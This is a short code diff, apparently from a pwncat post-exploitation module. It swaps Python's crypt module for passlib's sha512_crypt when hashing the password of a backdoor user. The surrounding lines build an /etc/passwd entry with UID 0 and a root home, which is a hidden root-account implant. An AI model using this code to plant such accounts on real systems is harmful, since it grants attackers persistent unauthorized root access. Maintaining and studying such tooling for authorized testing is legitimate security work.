@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
-import crypt
+
+from passlib.hash import sha512_crypt
 
 import pwncat
 from pwncat.facts import Implant, ImplantType
@@ -93,7 +94,7 @@ class Module(ImplantModule):
 
         # Hash the password
         yield Status("hashing password")
-        backdoor_hash = crypt.crypt(backdoor_pass, crypt.METHOD_SHA512)
+        backdoor_hash = sha512_crypt.using(salt_size=16).hash(backdoor_pass)
 
         # Store the new line we are adding
         new_line = f"""{backdoor_user}:{backdoor_hash}:0:0::/root:{shell}\n"""
